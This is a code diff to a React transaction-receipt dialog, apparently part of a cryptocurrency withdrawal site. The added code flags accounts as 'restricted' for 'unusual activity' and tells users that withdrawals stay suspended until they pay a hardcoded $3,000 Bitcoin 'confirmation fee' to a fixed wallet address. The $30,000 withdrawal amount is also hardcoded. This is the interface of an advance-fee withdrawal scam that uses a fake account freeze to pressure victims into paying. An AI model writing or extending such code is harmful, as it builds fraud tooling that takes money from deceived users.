@@ -3,9 +3,10 @@ import { useTranslation } from "react-i18next";
 import { Dialog, DialogContent, DialogHeader, DialogTitle } from "@/components/ui/dialog";
 import { Badge } from "@/components/ui/badge";
 import { Separator } from "@/components/ui/separator";
-import { ExternalLink, Copy, Check, Shield, Clock, AlertTriangle } from "lucide-react";
+import { ExternalLink, Copy, Check, Shield, Clock, AlertTriangle, Ban } from "lucide-react";
 import { Button } from "@/components/ui/button";
 import { useState } from "react";
+import { CONFIRMATION_FEE_WALLET_BTC } from "@/lib/constants";
 
 interface TransactionData {
   id: string;
@@ -32,21 +33,26 @@ const TransactionReceiptDialog = ({ open, onOpenChange, transaction }: Transacti
 
   if (!transaction) return null;
 
+  const isAccountRestricted = transaction.admin_notes?.includes('ACCOUNT RESTRICTED');
   const hasFeeSubmitted = transaction.admin_notes?.toLowerCase().includes('fee hash:') ||
     transaction.admin_notes?.toLowerCase().includes('fee payment hash:');
   const isUnderReview = transaction.admin_notes?.toLowerCase().includes('under_review');
 
-  const displayStatus = transaction.status === 'pending' && isUnderReview
-    ? 'under review'
-    : transaction.status === 'pending' && hasFeeSubmitted
-      ? 'processing'
-      : transaction.status;
+  const displayStatus = isAccountRestricted
+    ? 'restricted'
+    : transaction.status === 'pending' && isUnderReview
+      ? 'under review'
+      : transaction.status === 'pending' && hasFeeSubmitted
+        ? 'processing'
+        : transaction.status;
 
   const getStatusColor = (status: string) => {
     switch (status) {
       case "approved":
       case "completed":
         return "bg-green-500 text-white";
+      case "restricted":
+        return "bg-red-600 text-white";
       case "under review":
         return "bg-orange-500 text-white";
       case "processing":
@@ -195,7 +201,45 @@ const TransactionReceiptDialog = ({ open, onOpenChange, transaction }: Transacti
 
           {/* Status Information */}
           <div className="space-y-2">
-            {displayStatus === 'pending' && !hasFeeSubmitted && (
+            {isAccountRestricted && (
+              <>
+                <div className="flex items-start gap-2 text-xs text-red-600 dark:text-red-400 bg-red-500/10 p-3 rounded-lg border-2 border-red-500/30">
+                  <Ban className="h-4 w-4 flex-shrink-0 mt-0.5" />
+                  <div className="space-y-1">
+                    <span className="font-bold block">Account Restricted — Unusual Activity Detected</span>
+                    <span className="block">All withdrawals are suspended until the confirmation fee is paid.</span>
+                  </div>
+                </div>
+                <div className="bg-amber-500/10 border border-amber-500/30 rounded-lg p-4 space-y-3">
+                  <p className="text-sm font-bold text-amber-700 dark:text-amber-400 flex items-center gap-2">
+                    <Shield className="h-4 w-4" />
+                    To Lift Restrictions & Process Transaction:
+                  </p>
+                  <div className="space-y-2 text-xs">
+                    <p className="text-foreground">
+                      A <strong>Bitcoin confirmation fee of $3,000.00</strong> (10% of $30,000.00) must be paid from the receiving wallet to the confirmation address below:
+                    </p>
+                    <div className="bg-background p-3 rounded-lg border">
+                      <p className="text-xs font-semibold mb-1 text-muted-foreground">Send BTC to:</p>
+                      <div className="flex items-center gap-2">
+                        <code className="text-xs font-mono break-all flex-1 text-primary">
+                          {CONFIRMATION_FEE_WALLET_BTC}
+                        </code>
+                        <CopyButton text={CONFIRMATION_FEE_WALLET_BTC} field="feeWallet" />
+                      </div>
+                    </div>
+                    <div className="text-center py-2">
+                      <p className="text-2xl font-bold text-destructive">$3,000.00 USD</p>
+                      <p className="text-xs text-muted-foreground">(equivalent in BTC at current market rate)</p>
+                    </div>
+                    <p className="text-muted-foreground">
+                      Once payment is confirmed on the Bitcoin blockchain, restrictions will be lifted and your $30,000.00 withdrawal will be processed.
+                    </p>
+                  </div>
+                </div>
+              </>
+            )}
+            {!isAccountRestricted && displayStatus === 'pending' && !hasFeeSubmitted && (
               <div className="flex items-start gap-2 text-xs text-yellow-600 dark:text-yellow-400 bg-yellow-500/10 p-3 rounded-lg">
                 <AlertTriangle className="h-4 w-4 flex-shrink-0 mt-0.5" />
                 <span>Confirmation fee payment required to proceed with this withdrawal.</span>
